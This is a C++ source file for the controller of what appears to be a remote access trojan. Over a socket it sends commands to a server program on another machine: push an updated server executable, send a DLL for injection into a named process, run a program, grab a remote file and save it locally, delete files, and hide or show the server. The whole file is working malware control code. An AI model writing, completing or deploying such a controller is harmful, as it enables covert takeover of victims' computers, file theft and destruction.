#include "winsockfuncs.h"
#include <iostream>
#include <string>
#define DEFAULT_BUFLEN 1024
#define DEFAULT_PORT "8850"
#define DEFAULT_IP "127.0.0.1"
#pragma warning(disable:4996)

int last_dash(char*);
int main() {
	try {
		char ip[DEFAULT_BUFLEN];
		printf("Enter ip: ");
		scanf_s("%s", ip, DEFAULT_BUFLEN);
		if (strcmp(ip, "/") == 0) {
			strcpy_s(ip, DEFAULT_IP);
		}
		SOCKET socket = connectClientSocket(DEFAULT_PORT, ip);
		char* sendmsg = (char*)malloc(DEFAULT_BUFLEN);
		while (true) {
			scanf_s("%s", sendmsg, DEFAULT_BUFLEN);
			sendMessage(sendmsg, socket);
			if (strcmp(sendmsg, "CLOSE") == 0) {
				break;
			}
			else if (strcmp(sendmsg, "UPDATE") == 0) {
				//get exe path
				PCHAR buff;
				char *path = (char*)malloc(DEFAULT_BUFLEN);
				DWORD fin_size;
				fgets(path, DEFAULT_BUFLEN, stdin);
				path[strlen(path) - 1] = '\0';
				path++;
				if (strcmp(path, "/") == 0) {
					GetModuleFileNameA(NULL, path, DEFAULT_BUFLEN);
					path[strlen(path) - 35] = '\0';
					strcat(path, (char*)"server_final\\Debug\\server_final.exe");
				}
				//get exe
				HANDLE fin = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
				fin_size = GetFileSize(fin, NULL);
				buff = (PCHAR)malloc(fin_size);
				ReadFile(fin, buff, fin_size, NULL, NULL);
				//send exe
				PCHAR fin_size_str = (PCHAR)malloc(DEFAULT_BUFLEN);
				sprintf_s(fin_size_str, DEFAULT_BUFLEN, "%d", fin_size);
				sendMessage(fin_size_str, socket);
				sendFile(socket, buff, fin_size);
				//conformation
				char* msg = recvMessage(socket);
				printf("server sent: %s\n", msg);
			}
			else if (strcmp(sendmsg, "INJ") == 0) {
				//param (dll path-exe path)
				PCHAR buff;
				PCHAR dll_path = (PCHAR)malloc(DEFAULT_BUFLEN);
				DWORD fin_size;
				fgets(dll_path, DEFAULT_BUFLEN, stdin);
				dll_path[strlen(dll_path) - 1] = '\0';
				dll_path++;
				char* proc_path = dll_path + last_dash(dll_path) + 1;
				dll_path[last_dash(dll_path)] = '\0';
				//get dll
				HANDLE fin = CreateFileA(dll_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
				fin_size = GetFileSize(fin, NULL);
				buff = (PCHAR)malloc(fin_size);
				ReadFile(fin, buff, fin_size, NULL, NULL);
				CloseHandle(fin);
				PCHAR fin_size_str = (PCHAR)malloc(DEFAULT_BUFLEN);
				sprintf_s(fin_size_str, DEFAULT_BUFLEN, "%d", fin_size);
				//send dll and exe path
				sendMessage(fin_size_str, socket);
				sendFile(socket, buff, fin_size);
				sendMessage(proc_path, socket);
				//conformation
				char* msg = recvMessage(socket);
				printf("server sent: %s\n", msg);
			}
			else if (strcmp(sendmsg, "PRINT") == 0) {
				//param (string)
				fgets(sendmsg, DEFAULT_BUFLEN, stdin);
				sendmsg[strlen(sendmsg) - 1] = '\0';
				sendmsg++;
				//send string
				sendMessage(sendmsg, socket);
			}
			else if (strcmp(sendmsg, "PING") == 0) {
				//response
				char* recvmsg = recvMessage(socket);
				printf("server sent: %s\n", recvmsg);
			}
			else if (strcmp(sendmsg, "RUN") == 0) {
				//param (exe path)
				fgets(sendmsg, DEFAULT_BUFLEN, stdin);
				sendmsg[strlen(sendmsg) - 1] = '\0';
				sendmsg++;
				//send path
				sendMessage(sendmsg, socket);
				//conformation
				char* msg = recvMessage(socket);
				printf("server sent: %s\n", msg);
			}
			else if (strcmp(sendmsg, "VERSION") == 0) {
				//response
				char* recvmsg = recvMessage(socket);
				printf("server sent: %s\n", recvmsg);
			}
			else if (strcmp(sendmsg, "GRAB") == 0) {
				//param (file path)
				fgets(sendmsg, DEFAULT_BUFLEN, stdin);
				sendmsg[strlen(sendmsg) - 1] = '\0';
				sendmsg++;
				//send path
				sendMessage(sendmsg, socket);
				//get file
				int size = atoi(recvMessage(socket));
				char* buff = recvFile(socket, size);
				char path[DEFAULT_BUFLEN];
				buff[size] = '\0';
				GetModuleFileNameA(NULL, path, DEFAULT_BUFLEN);
				path[strlen(path)-51]= '\0';
				strcat_s(path, "downloads\\grabbed.txt");
				HANDLE fout = CreateFileA(path, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
				WriteFile(fout, buff, size, NULL, NULL);
				CloseHandle(fout);
				//conformation
				char* msg = recvMessage(socket);
				printf("server sent:%s\n", msg);
			}
			else if (strcmp(sendmsg,"SHOW") == 0){
				//conformation
				char* msg = recvMessage(socket);
				printf("server sent: %s\n", msg);
			}
			else if (strcmp(sendmsg, "HIDE") == 0) {
				//conformation
				char* msg = recvMessage(socket);
				printf("server sent: %s\n", msg);
			}
			else if (strcmp(sendmsg, "DELETE") == 0) {
				//param (file path)
				fgets(sendmsg, DEFAULT_BUFLEN, stdin);
				sendmsg[strlen(sendmsg) - 1] = '\0';
				sendmsg++;
				//send path
				sendMessage(sendmsg, socket);
				//conformation
				char* msg = recvMessage(socket);
				printf("server sent: %s\n", msg);
			}
			else {
				printf("illegal command\n");
			}
		}
		printf("socket disconnected\n");
		system("pause");
		closeSocket(socket);
	}
	catch (const char* err) {
		printf(err);
		system("pause");
	}
	return 0;
}

int last_dash(char* word) {
	int index = -1;
	for (int i = 0; i < strlen(word); i++) {
		if (word[i] == '-') {
			index = i;
		}
	}
	if (index == -1){
		throw("ERROR: no spaces");
	}
	return index;
}